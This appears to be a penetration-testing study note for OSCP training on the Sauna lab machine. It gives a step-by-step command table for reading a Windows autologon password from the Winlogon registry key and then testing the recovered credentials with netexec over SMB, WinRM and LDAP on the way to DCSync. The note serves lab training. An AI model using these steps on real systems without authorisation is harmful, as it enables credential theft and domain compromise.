---
tags: [oscp, active-directory, windows, winlogon, autologon]
box_sources: [Sauna]
---

# AD - Winlogon Autologon

Use this stage after a Windows foothold when the account has no useful group membership or token privilege.

| Step | Command | What to look for | Next move |
|---|---|---|---|
| Confirm identity | `whoami` | Current user and domain | Continue if the shell is valid |
| Check groups | `whoami /groups` | Admin, Account Operators, or other useful membership | Follow the matching privilege path |
| Check privileges | `whoami /priv` | Enabled token privileges such as SeImpersonatePrivilege | Follow the matching privilege path |
| Query Winlogon | `Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" \| Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword` | Autologon username and stored password | Validate the account on SMB, WinRM, and LDAP |
| Validate candidate | `netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain` | Successful authentication and useful access | Test WinRM and LDAP, then check replication rights |
| Test remote shell | `netexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domain` | WinRM access | Use the service account for the next privilege path |
| Test directory access | `netexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain` | Authenticated LDAP access | Check direct DCSync rights before longer ACL chains |

> [!warning] 💡 Hint
> **Watch out:** `DefaultUserName` can be a display name rather than the account's SAMAccountName. A failed login with the displayed value does not prove the password is wrong. Try the directory account name and validate it with NetExec.

> [!warning] 💡 Hint
> **Watch out:** Winlogon may expose an autologon password in cleartext because Windows needs it to sign in automatically. Treat the value as a credential and do not leave it in screenshots or notes.

✅ Go to [[AD - DCSync]] after the account is validated and has replication rights.

✅ Go to [[Active Directory (Decision Tree)]] if the registry has no useful values or validation fails.

## External Resources

- [HackTricks: Credentials from Windows Registry](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-from-registry)
- [Microsoft: Autologon](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)
